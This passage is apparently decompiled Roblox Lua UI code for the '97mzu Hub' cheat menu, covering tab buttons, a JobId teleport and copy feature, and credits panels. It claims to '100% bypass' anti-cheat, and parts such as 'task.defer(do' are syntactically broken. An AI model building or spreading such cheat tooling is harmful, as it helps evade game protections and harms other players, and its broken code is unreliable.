    TeleportService:TeleportToPlaceInstance(PlaceId, TextBox.Text, LocalPlayer);
end);
local Copy_JobId = Instance.new"TextButton";
Copy_JobId.Size = UDim2_New(1, 0, 0, 24);
Copy_JobId.BackgroundColor3 = FromRGB(27, 27, 27);
Copy_JobId.AutoButtonColor = false;
Copy_JobId.Text = "Copy JobId";
Copy_JobId.TextColor3 = R294_Result_6;
Copy_JobId.Font = Enum.Font.GothamBold;
Copy_JobId.TextSize = 9;
Copy_JobId.Parent = Frame_19;
r908 = Instance.new("UICorner", Copy_JobId);
r908.CornerRadius = UDim_New(0, 4);
local UIStroke_13 = Instance.new"UIStroke";
UIStroke_13.Color = R294_Result_4;
UIStroke_13.Parent = Copy_JobId;
Copy_JobId.MouseButton1Click:Connect(function(a_32, b_32, c_32)
    setclipboard(JobId);
end);
local Frame_20 = Instance.new"Frame";
Frame_20.Size = UDim2_New(1, 0, 1, 0);
Frame_20.BackgroundTransparency = 1;
Frame_20.Visible = false;
Frame_20.Parent = Frame_4;
local ScrollingFrame_6 = Instance.new"ScrollingFrame";
ScrollingFrame_6.Size = UDim2_New(1, -12, 1, -10);
ScrollingFrame_6.Position = UDim2_New(0, 6, 0, 5);
ScrollingFrame_6.BackgroundTransparency = 1;
ScrollingFrame_6.ScrollBarThickness = 0;
ScrollingFrame_6.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_6.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_6.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_6.Parent = Frame_20;
local UIListLayout_8 = Instance.new"UIListLayout";
UIListLayout_8.Padding = UDim_New(0, 8);
UIListLayout_8.Parent = ScrollingFrame_6;
local Frame_21 = Instance.new"Frame";
Frame_21.Size = UDim2_New(1, 0, 0, 75);
Frame_21.BackgroundColor3 = R294_Result_3;
Frame_21.Parent = ScrollingFrame_6;
r933 = Instance.new("UICorner", Frame_21);
r933.CornerRadius = UDim_New(0, 6);
local About_Of_Script = Instance.new"TextLabel";
About_Of_Script.Size = UDim2_New(1, -20, 1, 0);
About_Of_Script.Position = UDim2_New(0, 10, 0, -28);
About_Of_Script.BackgroundTransparency = 1;
About_Of_Script.Text = "About Of Script";
About_Of_Script.TextColor3 = R294_Result_6;
About_Of_Script.Font = Enum.Font.GothamBold;
About_Of_Script.TextSize = 12;
local _ = Enum.TextXAlignment.Left;
About_Of_Script.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
About_Of_Script.TextYAlignment = Enum.TextYAlignment.Center;
About_Of_Script.Parent = Frame_21;
local Regex = Instance.new"TextLabel";
Regex.Size = UDim2_New(1, -20, 1, 0);
Regex.Position = UDim2_New(0, 10, 0, 0);
Regex.BackgroundTransparency = 1;
Regex.Text = "\n97mzu UI Library v2.6\nMobile & PC Support\nui was inspired by the neptune/alchemy hub owner,\n but I made this one, it was kind of like expiration - 97mzu Hub Credits to 97mzu dc\nAnd Is Security 100% Bypass ac";
Regex.TextColor3 = R294_Result_5;
Regex.Font = Enum.Font.GothamBold;
Regex.TextSize = 11;
local _ = Enum.TextXAlignment.Left;
Regex.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Regex.TextYAlignment = Enum.TextYAlignment.Center;
Regex.Parent = Frame_21;
local Frame_22 = Instance.new"Frame";
Frame_22.Size = UDim2_New(1, 0, 0, 50);
Frame_22.Position = UDim2_New(0, 0, 1, -50);
Frame_22.BackgroundColor3 = R294_Result_2;
Frame_22.BorderSizePixel = 0;
Frame_22.Parent = Frame;
local Frame_23 = Instance.new"Frame";
Frame_23.Size = UDim2_New(1, 0, 0, 1);
Frame_23.BackgroundColor3 = R294_Result_4;
Frame_23.BorderSizePixel = 0;
Frame_23.Parent = Frame_22;
local Frame_24 = Instance.new"Frame";
Frame_24.Size = UDim2_New(0, 221, 1, 0);
Frame_24.Position = UDim2_New(0.5, -110, 0, 0);
Frame_24.BackgroundTransparency = 1;
Frame_24.Parent = Frame_22;
local UIListLayout_9 = Instance.new"UIListLayout";
local _ = Enum.FillDirection.Horizontal;
UIListLayout_9.FillDirection = Enum.FillDirection.Horizontal;
local _ = Enum.HorizontalAlignment.Center;
UIListLayout_9.HorizontalAlignment = Enum.HorizontalAlignment.Center;
local _ = Enum.VerticalAlignment.Center;
UIListLayout_9.VerticalAlignment = Enum.VerticalAlignment.Center;
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_9.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_9.Padding = UDim_New(0, 15);
UIListLayout_9.Parent = Frame_24;
local TextButton_2 = Instance.new"TextButton";
TextButton_2.Size = UDim2_New(0, 44, 0, 32);
TextButton_2.BackgroundTransparency = 0;
TextButton_2.BackgroundColor3 = R294_Result_5;
TextButton_2.Text = "";
TextButton_2.AutoButtonColor = false;
TextButton_2.Parent = Frame_24;
r981 = Instance.new("UICorner", TextButton_2);
r981.CornerRadius = UDim_New(0, 6);
local ImageLabel_5 = Instance.new"ImageLabel";
ImageLabel_5.Size = UDim2_New(0, 18, 0, 18);
ImageLabel_5.Position = UDim2_New(0.5, -9, 0.5, -9);
ImageLabel_5.BackgroundTransparency = 1;
ImageLabel_5.Image = "rbxassetid://81899856845503";
ImageLabel_5.ImageColor3 = FromRGB(16, 16, 18);
ImageLabel_5.Parent = TextButton_2;
local TextButton_3 = Instance.new"TextButton";
TextButton_3.Size = UDim2_New(0, 44, 0, 32);
TextButton_3.BackgroundTransparency = 1;
TextButton_3.BackgroundColor3 = R294_Result_5;
TextButton_3.Text = "";
TextButton_3.AutoButtonColor = false;
TextButton_3.Parent = Frame_24;
r994 = Instance.new("UICorner", TextButton_3);
r994.CornerRadius = UDim_New(0, 6);
local ImageLabel_6 = Instance.new"ImageLabel";
ImageLabel_6.Size = UDim2_New(0, 18, 0, 18);
ImageLabel_6.Position = UDim2_New(0.5, -9, 0.5, -9);
ImageLabel_6.BackgroundTransparency = 1;
ImageLabel_6.Image = "rbxassetid://126601646824958";
ImageLabel_6.ImageColor3 = R294_Result_7;
ImageLabel_6.Parent = TextButton_3;
local TextButton_4 = Instance.new"TextButton";
TextButton_4.Size = UDim2_New(0, 44, 0, 32);
TextButton_4.BackgroundTransparency = 1;
TextButton_4.BackgroundColor3 = R294_Result_5;
TextButton_4.Text = "";
TextButton_4.AutoButtonColor = false;
TextButton_4.Parent = Frame_24;
r1005 = Instance.new("UICorner", TextButton_4);
r1005.CornerRadius = UDim_New(0, 6);
local ImageLabel_7 = Instance.new"ImageLabel";
ImageLabel_7.Size = UDim2_New(0, 18, 0, 18);
ImageLabel_7.Position = UDim2_New(0.5, -9, 0.5, -9);
ImageLabel_7.BackgroundTransparency = 1;
ImageLabel_7.Image = "rbxassetid://96448232078753";
ImageLabel_7.ImageColor3 = R294_Result_7;
ImageLabel_7.Parent = TextButton_4;
local TextButton_5 = Instance.new"TextButton";
TextButton_5.Size = UDim2_New(0, 44, 0, 32);
TextButton_5.BackgroundTransparency = 1;
TextButton_5.BackgroundColor3 = R294_Result_5;
TextButton_5.Text = "";
TextButton_5.AutoButtonColor = false;
TextButton_5.Parent = Frame_24;
r1016 = Instance.new("UICorner", TextButton_5);
r1016.CornerRadius = UDim_New(0, 6);
local ImageLabel_8 = Instance.new"ImageLabel";
ImageLabel_8.Size = UDim2_New(0, 18, 0, 18);
ImageLabel_8.Position = UDim2_New(0.5, -9, 0.5, -9);
ImageLabel_8.BackgroundTransparency = 1;
ImageLabel_8.Image = "rbxassetid://101463883805422";
ImageLabel_8.ImageColor3 = R294_Result_7;
ImageLabel_8.Parent = TextButton_5;
TextButton_2.MouseButton1Click:Connect(function(a_33, b_33, c_33)
    TweenService:Create(TextButton_2, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_3, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_4, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_5, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_5, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_6, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_7, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_8, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_2, r1036(0.2), {
        ["BackgroundTransparency"] = 0
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_5, r1036(0.2), {
        ["ImageColor3"] = FromRGB(16, 16, 18)
    }):Play();
    r1040:Play();
    ScrollingFrame.Visible = false;
    Frame_3.Visible = false;
    Frame_4.Visible = true;
    Frame_5.Visible = true;
    Frame_9.Visible = false;
    Frame_20.Visible = false;
end);
TextButton_3.MouseButton1Click:Connect(function(a_34, b_34, c_34)
    TweenService:Create(TextButton_2, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_3, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_4, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_5, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_5, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_6, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_7, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_8, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_3, r1036(0.2), {
        ["BackgroundTransparency"] = 0
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_6, r1036(0.2), {
        ["ImageColor3"] = FromRGB(16, 16, 18)
    }):Play();
    r1040:Play();
    ScrollingFrame.Visible = false;
    Frame_3.Visible = false;
    Frame_4.Visible = true;
    Frame_5.Visible = false;
    Frame_9.Visible = true;
    Frame_20.Visible = false;
end);
TextButton_4.MouseButton1Click:Connect(function(a_35, b_35, c_35)
    TweenService:Create(TextButton_2, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_3, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_4, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_5, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_5, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_6, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_7, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_8, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_4, r1036(0.2), {
        ["BackgroundTransparency"] = 0
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_7, r1036(0.2), {
        ["ImageColor3"] = FromRGB(16, 16, 18)
    }):Play();
    r1040:Play();
    ScrollingFrame.Visible = true;
    Frame_3.Visible = true;
    Frame_4.Visible = false;
    Frame_5.Visible = false;
    Frame_9.Visible = false;
    Frame_20.Visible = false;
end);
TextButton_5.MouseButton1Click:Connect(function(a_36, b_36, c_36)
    TweenService:Create(TextButton_2, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_3, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_4, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_5, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_5, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_6, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_7, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_8, r1036(0.2), {
        ["ImageColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    TweenService:Create(TextButton_5, r1036(0.2), {
        ["BackgroundTransparency"] = 0
    }):Play();
    r1040:Play();
    TweenService:Create(ImageLabel_8, r1036(0.2), {
        ["ImageColor3"] = FromRGB(16, 16, 18)
    }):Play();
    r1040:Play();
    ScrollingFrame.Visible = false;
    Frame_3.Visible = false;
    Frame_4.Visible = true;
    Frame_5.Visible = false;
    Frame_9.Visible = false;
    Frame_20.Visible = true;
end);
r1036 = TweenInfo.new;
r1040 = TweenService:Create(TextButton_2, r1036(0.2), {
    ["BackgroundTransparency"] = 1
});
r1040:Play();
r1040:Play();
TweenService:Create(TextButton_3, r1036(0.2), {
    ["BackgroundTransparency"] = 1
}):Play();
r1040:Play();
TweenService:Create(TextButton_4, r1036(0.2), {
    ["BackgroundTransparency"] = 1
}):Play();
r1040:Play();
TweenService:Create(TextButton_5, r1036(0.2), {
    ["BackgroundTransparency"] = 1
}):Play();
r1040:Play();
TweenService:Create(ImageLabel_5, r1036(0.2), {
    ["ImageColor3"] = R294_Result_7
}):Play();
r1040:Play();
TweenService:Create(ImageLabel_6, r1036(0.2), {
    ["ImageColor3"] = R294_Result_7
}):Play();
r1040:Play();
TweenService:Create(ImageLabel_7, r1036(0.2), {
    ["ImageColor3"] = R294_Result_7
}):Play();
r1040:Play();
TweenService:Create(ImageLabel_8, r1036(0.2), {
    ["ImageColor3"] = R294_Result_7
}):Play();
r1040:Play();
TweenService:Create(TextButton_2, r1036(0.2), {
    ["BackgroundTransparency"] = 0
}):Play();
r1040:Play();
TweenService:Create(ImageLabel_5, r1036(0.2), {
    ["ImageColor3"] = FromRGB(16, 16, 18)
}):Play();
r1040:Play();
ScrollingFrame.Visible = false;
Frame_3.Visible = false;
Frame_4.Visible = true;
Frame_5.Visible = true;
Frame_9.Visible = false;
Frame_20.Visible = false;
local TextButton_6 = Instance.new"TextButton";
TextButton_6.Size = UDim2_New(1, 0, 0, 40);
TextButton_6.BackgroundTransparency = 1;
TextButton_6.Text = "";
TextButton_6.AutoButtonColor = false;
TextButton_6.Parent = ScrollingFrame;
local Frame_25 = Instance.new"Frame";
Frame_25.Size = UDim2_New(0, 3, 0, 22);
Frame_25.Position = UDim2_New(0, 0, 0.5, -11);
Frame_25.BackgroundColor3 = R294_Result_5;
Frame_25.BackgroundTransparency = 1;
Frame_25.Parent = TextButton_6;
r1146 = Instance.new("UICorner", Frame_25);
r1146.CornerRadius = UDim_New(1, 0);
local Update_Logs = Instance.new"TextLabel";
Update_Logs.Size = UDim2_New(1, -12, 0, 18);
Update_Logs.Position = UDim2_New(0, 12, 0, 4);
Update_Logs.BackgroundTransparency = 1;
Update_Logs.Text = "Update Logs";
Update_Logs.TextColor3 = R294_Result_7;
local _ = Enum.Font.GothamBold;
Update_Logs.Font = Enum.Font.GothamBold;
Update_Logs.TextSize = 11;
local _ = Enum.TextXAlignment.Left;
Update_Logs.TextXAlignment = Enum.TextXAlignment.Left;
Update_Logs.Parent = TextButton_6;
local Logs_Update_Credits = Instance.new"TextLabel";
Logs_Update_Credits.Size = UDim2_New(1, -12, 0, 14);
Logs_Update_Credits.Position = UDim2_New(0, 12, 0, 21);
Logs_Update_Credits.BackgroundTransparency = 1;
Logs_Update_Credits.Text = "Logs Update, Credits...";
Logs_Update_Credits.TextColor3 = R294_Result_7;
local _ = Enum.Font.Gotham;
Logs_Update_Credits.Font = Enum.Font.Gotham;
Logs_Update_Credits.TextSize = 11;
local _ = Enum.TextXAlignment.Left;
Logs_Update_Credits.TextXAlignment = Enum.TextXAlignment.Left;
Logs_Update_Credits.Parent = TextButton_6;
local Frame_26 = Instance.new"Frame";
Frame_26.Size = UDim2_New(1, 0, 1, 0);
Frame_26.BackgroundTransparency = 1;
Frame_26.Visible = false;
Frame_26.Parent = Frame_3;
local ScrollingFrame_7 = Instance.new"ScrollingFrame";
ScrollingFrame_7.Size = UDim2_New(0.5, -8, 1, -10);
ScrollingFrame_7.Position = UDim2_New(0, 6, 0, 5);
ScrollingFrame_7.BackgroundTransparency = 1;
ScrollingFrame_7.ScrollBarThickness = 1;
ScrollingFrame_7.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_7.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_7.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_7.Parent = Frame_26;
local UIListLayout_10 = Instance.new"UIListLayout";
UIListLayout_10.Padding = UDim_New(0, 8);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_10.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_10.Parent = ScrollingFrame_7;
local ScrollingFrame_8 = Instance.new"ScrollingFrame";
ScrollingFrame_8.Size = UDim2_New(0.5, -8, 1, -10);
ScrollingFrame_8.Position = UDim2_New(0.5, 2, 0, 5);
ScrollingFrame_8.BackgroundTransparency = 1;
ScrollingFrame_8.ScrollBarThickness = 1;
ScrollingFrame_8.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_8.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_8.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_8.Parent = Frame_26;
local UIListLayout_11 = Instance.new"UIListLayout";
UIListLayout_11.Padding = UDim_New(0, 8);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_11.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_11.Parent = ScrollingFrame_8;
TextButton_6.MouseButton1Click:Connect(function(a_37, b_37, c_37)
    local _ = TextButton_6 == TextButton_6;
end);
Frame_25.BackgroundTransparency = 0;
Update_Logs.TextColor3 = R294_Result_6;
Frame_26.Visible = true;
local Frame_27 = Instance.new"Frame";
Frame_27.Size = UDim2_New(1, 0, 0, 30);
Frame_27.BackgroundColor3 = R294_Result_3;
Frame_27.BorderSizePixel = 0;
ScrollingFrame_7:GetChildren();
Frame_27.LayoutOrder = 0;
Frame_27.Parent = ScrollingFrame_7;
r1206 = Instance.new("UICorner", Frame_27);
r1206.CornerRadius = UDim_New(0, 6);
local UIStroke_14 = Instance.new"UIStroke";
UIStroke_14.Color = R294_Result_4;
UIStroke_14.Parent = Frame_27;
local Credits = Instance.new"TextLabel";
Credits.Size = UDim2_New(1, -16, 0, 26);
Credits.Position = UDim2_New(0, 8, 0, 2);
Credits.BackgroundTransparency = 1;
Credits.Text = "Credits";
Credits.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Credits.Font = Enum.Font.GothamBold;
Credits.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Credits.TextXAlignment = Enum.TextXAlignment.Left;
Credits.Parent = Frame_27;
local Frame_28 = Instance.new"Frame";
Frame_28.Size = UDim2_New(1, 0, 1, -28);
Frame_28.Position = UDim2_New(0, 0, 0, 28);
Frame_28.BackgroundTransparency = 1;
Frame_28.Parent = Frame_27;
local UIListLayout_12 = Instance.new"UIListLayout";
UIListLayout_12.Padding = UDim_New(0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_12.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_12.Parent = Frame_28;
local UIPadding_5 = Instance.new"UIPadding";
UIPadding_5.PaddingLeft = UDim_New(0, 8);
UIPadding_5.PaddingRight = UDim_New(0, 8);
UIPadding_5.PaddingBottom = UDim_New(0, 8);
UIPadding_5.Parent = Frame_28;
UIListLayout_12:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function(a_38, b_38, c_38)
    Frame_27.Size = UDim2_New(
        1,
        0,
        0,
        UIListLayout_12.AbsoluteContentSize.Y + 36
    );
end);
local Frame_29 = Instance.new"Frame";
Frame_29.Size = UDim2_New(1, 0, 0, 30);
Frame_29.BackgroundColor3 = R294_Result_3;
Frame_29.BorderSizePixel = 0;
ScrollingFrame_8:GetChildren();
Frame_29.LayoutOrder = 0;
Frame_29.Parent = ScrollingFrame_8;
r1245 = Instance.new("UICorner", Frame_29);
r1245.CornerRadius = UDim_New(0, 6);
local UIStroke_15 = Instance.new"UIStroke";
UIStroke_15.Color = R294_Result_4;
UIStroke_15.Parent = Frame_29;
local Logs_Script = Instance.new"TextLabel";
Logs_Script.Size = UDim2_New(1, -16, 0, 26);
Logs_Script.Position = UDim2_New(0, 8, 0, 2);
Logs_Script.BackgroundTransparency = 1;
Logs_Script.Text = "Logs Script";
Logs_Script.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Logs_Script.Font = Enum.Font.GothamBold;
Logs_Script.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Logs_Script.TextXAlignment = Enum.TextXAlignment.Left;
Logs_Script.Parent = Frame_29;
local Frame_30 = Instance.new"Frame";
Frame_30.Size = UDim2_New(1, 0, 1, -28);
Frame_30.Position = UDim2_New(0, 0, 0, 28);
Frame_30.BackgroundTransparency = 1;
Frame_30.Parent = Frame_29;
local UIListLayout_13 = Instance.new"UIListLayout";
UIListLayout_13.Padding = UDim_New(0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_13.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_13.Parent = Frame_30;
local UIPadding_6 = Instance.new"UIPadding";
UIPadding_6.PaddingLeft = UDim_New(0, 8);
UIPadding_6.PaddingRight = UDim_New(0, 8);
UIPadding_6.PaddingBottom = UDim_New(0, 8);
UIPadding_6.Parent = Frame_30;
UIListLayout_13:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function(a_39, b_39, c_39)
    Frame_29.Size = UDim2_New(
        1,
        0,
        0,
        UIListLayout_13.AbsoluteContentSize.Y + 36
    );
end);
local TextService = game:GetService("TextService");
local Frame_31 = Instance.new"Frame";
Frame_31.BackgroundColor3 = FromRGB(27, 27, 27);
Frame_31.BorderSizePixel = 0;
Frame_31.LayoutOrder = 1;
Frame_31.Parent = Frame_28;
r1284 = Instance.new("UICorner", Frame_31);
r1284.CornerRadius = UDim_New(0, 8);
local UIStroke_16 = Instance.new"UIStroke";
UIStroke_16.Color = R294_Result_4;
UIStroke_16.Thickness = 1;
UIStroke_16.Parent = Frame_31;
local UIPadding_7 = Instance.new"UIPadding";
UIPadding_7.PaddingTop = UDim_New(0, 10);
UIPadding_7.PaddingBottom = UDim_New(0, 10);
UIPadding_7.PaddingLeft = UDim_New(0, 10);
UIPadding_7.PaddingRight = UDim_New(0, 10);
UIPadding_7.Parent = Frame_31;
local ImageLabel_9 = Instance.new"ImageLabel";
ImageLabel_9.Size = UDim2_New(0, 32, 0, 32);
ImageLabel_9.Position = UDim2_New(0, 0, 0.5, -16);
ImageLabel_9.BackgroundTransparency = 1;
ImageLabel_9.Image = "rbxassetid://108596842896103";
ImageLabel_9.Parent = Frame_31;
local UICorner_92 = Instance.new"UICorner";
UICorner_92.CornerRadius = UDim_New(1, 0);
UICorner_92.Parent = ImageLabel_9;
local _97mzu = Instance.new"TextLabel";
_97mzu.Size = UDim2_New(1, -40, 0, 16);
_97mzu.Position = UDim2_New(0, 40, 0, 0);
_97mzu.BackgroundTransparency = 1;
_97mzu.Text = "97mzu";
_97mzu.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
_97mzu.Font = Enum.Font.GothamBold;
_97mzu.TextSize = 12;
local _ = Enum.TextXAlignment.Left;
_97mzu.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
_97mzu.TextYAlignment = Enum.TextYAlignment.Center;
_97mzu.Parent = Frame_31;
local TextLabel_6 = Instance.new"TextLabel";
TextLabel_6.Size = UDim2_New(1, -40, 0, 0);
TextLabel_6.Position = UDim2_New(0, 40, 0, 15);
TextLabel_6.BackgroundTransparency = 1;
TextLabel_6.Text = "Hub owner, UI designer, developer, bypasser";
TextLabel_6.TextColor3 = R294_Result_7;
TextLabel_6.Font = Enum.Font.GothamBold;
TextLabel_6.TextSize = 10;
TextLabel_6.TextWrapped = true;
local _ = Enum.TextXAlignment.Left;
TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Top;
TextLabel_6.TextYAlignment = Enum.TextYAlignment.Top;
TextLabel_6.Parent = Frame_31;
Frame_31:GetPropertyChangedSignal("AbsoluteSize"):Connect(function(a_13, b_13, c_13)
    R1333_X = r1333.X;
    R1333_X_2_Minus_Number = R1333_X - 60;
    Math_Max_Result = math.max(100, R1333_X_2_Minus_Number);
    R1340_Result = r1340(Math_Max_Result, 1e4);
    TextSize = TextService:GetTextSize(r1337, r1338, r1339, R1340_Result);
    R4308_Y = TextSize.Y;
    R397_Result = UDim2_New(1, -40, 0, R4308_Y);
    TextLabel_6.Size = R397_Result;
    R4308_Y_2 = TextSize.Y;
    Number_2_Plus_R4308_Y_3 = 28 + R4308_Y_2;
    r4314 = Number_2_Plus_R4308_Y_3 + 10;
    Math_Max_Result_2 = math.max(52, r4314);
    R397_Result_2 = UDim2_New(1, 0, 0, Math_Max_Result_2);
    Frame_31.Size = R397_Result_2;
end);
TextLabel_6:GetPropertyChangedSignal("Text"):Connect(function(a_13, b_13, c_13)
    R1333_X = r1333.X;
    R1333_X_2_Minus_Number = R1333_X - 60;
    Math_Max_Result = math.max(100, R1333_X_2_Minus_Number);
    R1340_Result = r1340(Math_Max_Result, 1e4);
    TextSize = TextService:GetTextSize(r1337, r1338, r1339, R1340_Result);
    R4308_Y = TextSize.Y;
    R397_Result = UDim2_New(1, -40, 0, R4308_Y);
    TextLabel_6.Size = R397_Result;
    R4308_Y_2 = TextSize.Y;
    Number_2_Plus_R4308_Y_3 = 28 + R4308_Y_2;
    r4314 = Number_2_Plus_R4308_Y_3 + 10;
    Math_Max_Result_2 = math.max(52, r4314);
    R397_Result_2 = UDim2_New(1, 0, 0, Math_Max_Result_2);
    Frame_31.Size = R397_Result_2;
end);

task.defer(do
    r1333 = Frame_31.AbsoluteSize;
    r1337 = TextLabel_6.Text;
    r1338 = TextLabel_6.TextSize;
    r1339 = TextLabel_6.Font;
    r1340 = Vector2.new;
    local TextSize_3 = TextService:GetTextSize(
        r1337,
        r1338,
        r1339,
        r1340(
        math.max(
            100,
            r1333.X - 60
        ),
        1e4
    )
    );
    TextLabel_6.Size = UDim2_New(1, -40, 0, TextSize_3.Y);
    Frame_31.Size = UDim2_New(
        1,
        0,
        0,
        math.max(
            52,
            (
                28 + TextSize_3.Y
            ) + 10
        )
    );
end);
game:GetService("TextService");
local Frame_32 = Instance.new"Frame";
Frame_32.BackgroundColor3 = FromRGB(27, 27, 27);
Frame_32.BorderSizePixel = 0;
Frame_32.LayoutOrder = 2;
Frame_32.Parent = Frame_28;
r1359 = Instance.new("UICorner", Frame_32);
r1359.CornerRadius = UDim_New(0, 8);
local UIStroke_17 = Instance.new"UIStroke";
UIStroke_17.Color = R294_Result_4;
UIStroke_17.Thickness = 1;
UIStroke_17.Parent = Frame_32;
local UIPadding_8 = Instance.new"UIPadding";
UIPadding_8.PaddingTop = UDim_New(0, 10);
UIPadding_8.PaddingBottom = UDim_New(0, 10);
UIPadding_8.PaddingLeft = UDim_New(0, 10);
UIPadding_8.PaddingRight = UDim_New(0, 10);
UIPadding_8.Parent = Frame_32;
local ImageLabel_10 = Instance.new"ImageLabel";
ImageLabel_10.Size = UDim2_New(0, 32, 0, 32);
ImageLabel_10.Position = UDim2_New(0, 0, 0.5, -16);
ImageLabel_10.BackgroundTransparency = 1;
ImageLabel_10.Image = "rbxassetid://112720195907138";
ImageLabel_10.Parent = Frame_32;
local UICorner_93 = Instance.new"UICorner";
UICorner_93.CornerRadius = UDim_New(1, 0);
UICorner_93.Parent = ImageLabel_10;
local Keel = Instance.new"TextLabel";
Keel.Size = UDim2_New(1, -40, 0, 16);
Keel.Position = UDim2_New(0, 40, 0, 0);
Keel.BackgroundTransparency = 1;
Keel.Text = "Keel";
Keel.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Keel.Font = Enum.Font.GothamBold;
Keel.TextSize = 12;
local _ = Enum.TextXAlignment.Left;
Keel.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Keel.TextYAlignment = Enum.TextYAlignment.Center;
Keel.Parent = Frame_32;
local Hub_Owner_Suggestions_Helpers = Instance.new"TextLabel";
Hub_Owner_Suggestions_Helpers.Size = UDim2_New(1, -40, 0, 0);
Hub_Owner_Suggestions_Helpers.Position = UDim2_New(0, 40, 0, 15);
Hub_Owner_Suggestions_Helpers.BackgroundTransparency = 1;
